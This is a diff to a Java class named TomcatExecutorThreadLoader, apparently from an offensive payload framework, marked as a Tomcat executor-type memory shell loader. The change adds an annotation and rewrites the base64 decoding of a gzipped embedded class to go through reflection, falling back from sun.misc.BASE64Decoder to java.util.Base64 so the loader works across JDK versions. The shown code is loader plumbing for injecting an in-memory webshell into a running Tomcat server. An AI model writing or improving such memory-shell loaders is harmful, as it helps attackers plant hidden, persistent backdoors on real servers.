@@ -2,12 +2,12 @@ package com.ppp.middleware.loader;
 
 
 import com.ppp.annotation.JavaClassModifiable;
+import com.ppp.annotation.JavaClassType;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.Middleware;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
-import java.io.IOException;
 import java.lang.reflect.*;
 import java.util.*;
 import java.util.concurrent.BlockingQueue;
@@ -21,6 +21,7 @@ import java.util.zip.GZIPInputStream;
  */
 @Middleware(Middleware.Tomcat)
 @MemShell(MemShell.Executor)
+@JavaClassType(JavaClassType.Default)
 @JavaClassModifiable({JavaClassModifiable.CLASSNAME})
 public class TomcatExecutorThreadLoader {
     private static String gzipObject;
@@ -80,9 +81,8 @@ public class TomcatExecutorThreadLoader {
         setFieldValue(nioEndpoint, "internalExecutor", false);
     }
 
-    public static byte[] decompress(String gzipObject) throws IOException {
-        final byte[] compressedData = new sun.misc.BASE64Decoder().decodeBuffer(gzipObject);
-        ByteArrayInputStream bais = new ByteArrayInputStream(compressedData);
+    public static byte[] decompress(String gzipObject) throws Exception {
+        ByteArrayInputStream bais = new ByteArrayInputStream(base64(gzipObject));
         try {
             GZIPInputStream gzipInputStream = new GZIPInputStream(bais);
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
@@ -96,6 +96,17 @@ public class TomcatExecutorThreadLoader {
 
         }
         return null;
+    }
+
+    public static byte[] base64(String str) throws Exception {
+        try {
+            Class clazz = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) invokeMethod(clazz.getSuperclass(), clazz.newInstance(), "decodeBuffer", new Class[]{String.class}, new Object[]{str});
+        } catch (Exception var5) {
+            Class clazz = Class.forName("java.util.Base64");
+            Object decoder = invokeMethod(clazz, null, "getDecoder", new Class[]{}, new Object[]{});
+            return (byte[]) invokeMethod(decoder.getClass(), decoder, "decode", new Class[]{String.class}, new Object[]{str});
+        }
     }
 
     public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
